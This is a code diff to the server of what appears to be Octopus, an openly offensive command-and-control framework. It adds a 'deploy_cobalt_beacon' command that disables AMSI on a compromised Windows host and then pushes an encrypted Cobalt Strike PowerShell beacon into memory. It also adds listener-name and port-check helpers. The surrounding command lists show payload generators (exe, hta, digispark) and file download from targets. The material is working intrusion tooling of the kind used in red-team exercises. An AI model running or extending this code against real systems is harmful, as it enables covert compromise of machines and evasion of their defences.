@@ -12,6 +12,7 @@ from .encryption import *
 from profile import *
 import time
 import os
+import socket
 
 requests = []
 counter = 1
@@ -24,7 +25,7 @@ aes_encryption_key = base64.b64encode(bytearray(key, "UTF-8")).decode()
 
 oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe","generate_hta", "generate_digispark"]
 
-oct_commands_interact = ["load", "help", "exit", "back", "clear", "download", "load", "report", "disable_amsi", "modules"]
+oct_commands_interact = ["load", "help", "exit", "back", "clear", "download", "load", "report", "disable_amsi", "modules", "deploy_cobalt_beacon"]
 
 def check_url(url):
     if len(listeners_information) > 0:
@@ -45,6 +46,25 @@ def check_listener_name(listener_name):
 			    return True
 	else:
 		return True
+
+def check_create_path(hostname):
+	if len(listeners_information) > 0:
+	    for listener in listeners_information:
+		    if hostname == listeners_information[listener][3]:
+			    return False
+		    else:
+			    return True
+	else:
+		return True
+
+def check_listener_port(host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.bind((host, port))
+        sock.close()
+        return True
+    except:
+        return False
 
 def list_sessions():
 	    data = []
@@ -114,6 +134,27 @@ def load_module(session, module_name):
 		print((colored("[+] Module should be loaded !", "green")))
 	else:
 		print((colored("[-] Module is not exist !")))
+
+def load_beacon(session, beacon_path):
+	fi = open(beacon_path, "r")
+	module_content = fi.read()
+	# encrypt module before send it
+	base64_command = encrypt_command(aes_encryption_key, module_content)
+	commands[session] = base64_command
+
+def deploy_cobalt_beacon(session, beacon_path):
+    if os.path.isfile(beacon_path):
+        print(colored("[+] Deploying Cobalt Strike Beacon into Octopus agent", "green"))
+        print(colored("[+] Disabling AMSI before running the Beacon", "green"))
+        disable_amsi(session)
+        # wait until the disable amsi loaded correctly
+        # need some tests, not stable
+        time.sleep(2)
+        load_beacon(session, beacon_path)
+        print(colored("[+]Cobalt Strike Beacon should be loaded into memory!", "green"))
+
+    else:
+        print(colored("[-] Powershell beacon file not exist!"))
 
 def disable_amsi(session):
 	amsi_module = "modules/ASBBypass.ps1"
@@ -232,6 +273,7 @@ def interact_help():
 	print("exit/back \t\t\texit current session and back to the main screen")
 	print("clear \t\t\t\tclear the screen output")
 	print("download \t\t\tdownload file from the target machine")
+	print("deploy_cobalt_beacon \t\tdeploy cobalt strike powershell beacon in the current process")
 	print("load \t\t\t\tload powershell module to the target machine")
 	print("disable_amsi \t\t\tdisable AMSI on the target machine")
 	print("report \t\t\t\tget situation report from the target")
